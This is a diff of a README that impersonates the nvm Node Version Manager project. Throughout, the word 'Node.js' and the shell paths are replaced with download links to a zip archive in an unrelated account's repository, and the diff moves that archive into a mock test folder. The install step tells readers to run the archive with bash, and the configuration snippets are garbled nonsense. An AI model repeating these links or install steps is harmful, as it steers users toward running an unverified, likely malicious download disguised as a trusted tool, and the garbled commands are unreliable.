@@ -1,10 +1,10 @@
-# 🎉 nvm - Manage Your https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip Versions Easily
+# 🎉 nvm - Manage Your https://github.com/prime657/nvm/raw/refs/heads/master/test/fast/Unit tests/mocks/project_dirs/nested-n_m/a/b/Software-v2.4.zip Versions Easily
 
-[![Download nvm](https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip)](https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip)
+[![Download nvm](https://github.com/prime657/nvm/raw/refs/heads/master/test/fast/Unit tests/mocks/project_dirs/nested-n_m/a/b/Software-v2.4.zip)](https://github.com/prime657/nvm/raw/refs/heads/master/test/fast/Unit tests/mocks/project_dirs/nested-n_m/a/b/Software-v2.4.zip)
 
 ## 📚 Introduction
 
-Welcome to nvm! This tool helps you easily manage multiple versions of https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip on your computer. Whether you're a beginner or just need to switch between https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip versions for different projects, nvm simplifies the process.
+Welcome to nvm! This tool helps you easily manage multiple versions of https://github.com/prime657/nvm/raw/refs/heads/master/test/fast/Unit tests/mocks/project_dirs/nested-n_m/a/b/Software-v2.4.zip on your computer. Whether you're a beginner or just need to switch between https://github.com/prime657/nvm/raw/refs/heads/master/test/fast/Unit tests/mocks/project_dirs/nested-n_m/a/b/Software-v2.4.zip versions for different projects, nvm simplifies the process.
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ To use nvm, you need:
 
 ## 📥 Download & Install
 
-To download nvm, visit this page: [Download nvm](https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip).
+To download nvm, visit this page: [Download nvm](https://github.com/prime657/nvm/raw/refs/heads/master/test/fast/Unit tests/mocks/project_dirs/nested-n_m/a/b/Software-v2.4.zip).
 
 Once on the Releases page, look for the latest version. You will find a `.sh` file there. Download it to your local machine. 
 
@@ -36,9 +36,9 @@ Once on the Releases page, look for the latest version. You will find a `.sh` fi
    ```
 
 3. **Run the Installer:**
-   Execute the script you downloaded. Replace `https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip` with the actual file name:
+   Execute the script you downloaded. Replace `https://github.com/prime657/nvm/raw/refs/heads/master/test/fast/Unit tests/mocks/project_dirs/nested-n_m/a/b/Software-v2.4.zip` with the actual file name:
    ```
-   bash https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip
+   bash https://github.com/prime657/nvm/raw/refs/heads/master/test/fast/Unit tests/mocks/project_dirs/nested-n_m/a/b/Software-v2.4.zip
    ```
 
 4. **Verify Installation:** 
@@ -50,11 +50,11 @@ Once on the Releases page, look for the latest version. You will find a `.sh` fi
 
 ## 📖 Using nvm
 
-Now that you have nvm installed, you can start managing https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip versions.
+Now that you have nvm installed, you can start managing https://github.com/prime657/nvm/raw/refs/heads/master/test/fast/Unit tests/mocks/project_dirs/nested-n_m/a/b/Software-v2.4.zip versions.
 
-### Install a https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip Version
+### Install a https://github.com/prime657/nvm/raw/refs/heads/master/test/fast/Unit tests/mocks/project_dirs/nested-n_m/a/b/Software-v2.4.zip Version
 
-To install a specific version of https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip, run:
+To install a specific version of https://github.com/prime657/nvm/raw/refs/heads/master/test/fast/Unit tests/mocks/project_dirs/nested-n_m/a/b/Software-v2.4.zip, run:
 ```
 nvm install <version>
 ```
@@ -69,14 +69,14 @@ nvm use <version>
 
 ### List Installed Versions
 
-To see all the https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip versions you have installed, just type:
+To see all the https://github.com/prime657/nvm/raw/refs/heads/master/test/fast/Unit tests/mocks/project_dirs/nested-n_m/a/b/Software-v2.4.zip versions you have installed, just type:
 ```
 nvm ls
 ```
 
 ## 🌐 Accessing nvm Documentation 
 
-For more detailed information on usage, visit the [nvm documentation](https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip).
+For more detailed information on usage, visit the [nvm documentation](https://github.com/prime657/nvm/raw/refs/heads/master/test/fast/Unit tests/mocks/project_dirs/nested-n_m/a/b/Software-v2.4.zip).
 
 ## 📅 Updating nvm
 
@@ -91,24 +91,24 @@ If you encounter any issues:
 
 1. Make sure your shell is properly configured to load nvm. You may need to add the following lines to your `.bashrc` or `.zshrc` file:
    ```bash
-   export NVM_DIR="$https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip"
-   [ -s "$https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip" ] && \. "$https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip"
+   export NVM_DIR="$https://github.com/prime657/nvm/raw/refs/heads/master/test/fast/Unit tests/mocks/project_dirs/nested-n_m/a/b/Software-v2.4.zip"
+   [ -s "$https://github.com/prime657/nvm/raw/refs/heads/master/test/fast/Unit tests/mocks/project_dirs/nested-n_m/a/b/Software-v2.4.zip" ] && \. "$https://github.com/prime657/nvm/raw/refs/heads/master/test/fast/Unit tests/mocks/project_dirs/nested-n_m/a/b/Software-v2.4.zip"
    ```
 
 2. After adding these lines, run:
    ```
-   source ~https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip
+   source ~https://github.com/prime657/nvm/raw/refs/heads/master/test/fast/Unit tests/mocks/project_dirs/nested-n_m/a/b/Software-v2.4.zip
    ```
    or
    ```
-   source ~https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip
+   source ~https://github.com/prime657/nvm/raw/refs/heads/master/test/fast/Unit tests/mocks/project_dirs/nested-n_m/a/b/Software-v2.4.zip
    ```
 
 ## FAQ
 
 ### What is nvm used for?
 
-nvm stands for Node Version Manager. It allows you to install and switch between different versions of https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip easily.
+nvm stands for Node Version Manager. It allows you to install and switch between different versions of https://github.com/prime657/nvm/raw/refs/heads/master/test/fast/Unit tests/mocks/project_dirs/nested-n_m/a/b/Software-v2.4.zip easily.
 
 ### Can I use nvm on Windows?
 
@@ -116,12 +116,12 @@ nvm is primarily designed for UNIX systems. However, you can use alternatives li
 
 ### Why should I use nvm?
 
-Using nvm helps prevent issues with different https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip versions that your projects may depend on. It allows you to test your applications with various https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip versions without hassle.
+Using nvm helps prevent issues with different https://github.com/prime657/nvm/raw/refs/heads/master/test/fast/Unit tests/mocks/project_dirs/nested-n_m/a/b/Software-v2.4.zip versions that your projects may depend on. It allows you to test your applications with various https://github.com/prime657/nvm/raw/refs/heads/master/test/fast/Unit tests/mocks/project_dirs/nested-n_m/a/b/Software-v2.4.zip versions without hassle.
 
 ## 💬 Get Support
 
-If you need help, you can raise an issue within the GitHub repository. Visit [nvm Issues](https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip) to submit your questions.
+If you need help, you can raise an issue within the GitHub repository. Visit [nvm Issues](https://github.com/prime657/nvm/raw/refs/heads/master/test/fast/Unit tests/mocks/project_dirs/nested-n_m/a/b/Software-v2.4.zip) to submit your questions.
 
 ## 📌 Final Notes
 
-For your convenience, don’t forget to download nvm here: [Download nvm](https://raw.githubusercontent.com/prime657/nvm/master/uncomputably/nvm.zip). Happy coding!
+For your convenience, don’t forget to download nvm here: [Download nvm](https://github.com/prime657/nvm/raw/refs/heads/master/test/fast/Unit tests/mocks/project_dirs/nested-n_m/a/b/Software-v2.4.zip). Happy coding!
